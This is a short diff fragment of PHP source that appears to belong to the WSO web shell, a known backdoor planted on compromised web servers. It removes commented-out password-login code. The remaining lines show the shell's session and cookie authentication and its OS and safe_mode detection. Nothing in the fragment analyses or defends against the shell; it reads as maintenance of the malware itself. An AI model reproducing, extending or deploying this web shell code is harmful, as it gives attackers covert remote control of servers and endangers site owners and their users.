@@ -55,25 +55,12 @@ if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
 	else
 		printLogin();
 
-	/*
-	function wsoLogin() {
-		die("<pre align=center><form method=post>Password: <input type=password name=pass><input type=submit value='Go'></form></pre>");
-	}
-	*/
 	
 	function WSOsetcookie($k, $v) {
 		$_COOKIE[$k] = $v;
 		setcookie($k, $v);
 	}
 
-	/*
-//	if(!empty($auth_pass)) {
-		
-		if(isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass))        WSOsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);
-		
-		if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))        wsoLogin();
-	}
-	*/
 	
 	if(strtolower(substr(PHP_OS,0,3)) == "win")    $os = 'win'; else    $os = 'nix';
 	$safe_mode = @ini_get('safe_mode');
